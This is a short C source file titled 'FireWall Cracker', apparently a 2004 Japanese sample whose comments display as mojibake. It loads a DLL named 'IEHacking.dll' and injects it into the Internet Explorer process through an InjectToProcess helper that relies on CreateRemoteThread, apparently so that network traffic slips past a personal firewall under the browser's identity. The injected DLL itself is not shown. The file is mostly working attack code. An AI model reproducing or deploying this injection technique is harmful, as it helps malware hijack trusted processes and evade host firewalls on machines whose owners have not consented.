//==========================================================
//		FireWall Cracker
//		�����̃t�@�C�A�E�H�[���ђʃT���v���ł��B
//
//		2004/08/19 by kimoto
//==========================================================
#include <windows.h>
#include "inject.h"

//==========================================================
//	�}�N���̐錾
//==========================================================
#define WINDOW_NAME "FireWall Cracker"
#define CLASS_NAME	"FireWall Cracker"

#define DLL_FILE_NAME "IEHacking.dll"
#define TARGET_PROCESS "IEXPLORE.EXE"
//==========================================================
//	�֐��̃v���g�^�C�v�̐錾
//==========================================================
LRESULT CALLBACK WndProc(HWND,UINT,WPARAM,LPARAM);

//==========================================================
//	���C���̊֐�
//==========================================================
BOOL WINAPI WinMain(HINSTANCE hInstance,
					HINSTANCE hPrevInstance,
					LPSTR lpCmdLine,
					int nShowCmd)
{
	TCHAR szDLLPath[MAX_PATH];

	//����������DLL�̃t���p�X���擾
	GetModuleFileName( NULL, szDLLPath, sizeof( szDLLPath ) );
	lstrcpy( ( strrchr( szDLLPath, '\\' ) + 1 ), DLL_FILE_NAME );
	
	//�Ƃ肠�����A�{����DLL�����݂��邩���ׂ�
	HMODULE hDLL;
	hDLL = LoadLibraryEx(
		szDLLPath,
		NULL,
		LOAD_LIBRARY_AS_DATAFILE);
	if(hDLL == NULL){

		MessageBox(
			NULL,
			"DLL�������f�B���N�g���Ɍ�����܂���B",
			"�m�F",
			MB_ICONEXCLAMATION);
		
		return -1;
	}

	if(InjectToProcess(szDLLPath,TARGET_PROCESS) == FALSE){

		MessageBox(
			NULL,
			"DLL�̒����Ɏ��s���܂����B\n"
			"InternetExplorer���N�����Ă��邩�m�F���Ă��������B\n"
			"�܂��ACreateRemoteThread�֐����g�p���Ă���̂�\n"
			"���̃v���O�����́AWindowsNT�n��p�ł��B",
			"�m�F",
			MB_ICONEXCLAMATION);

	}

	return TRUE;

}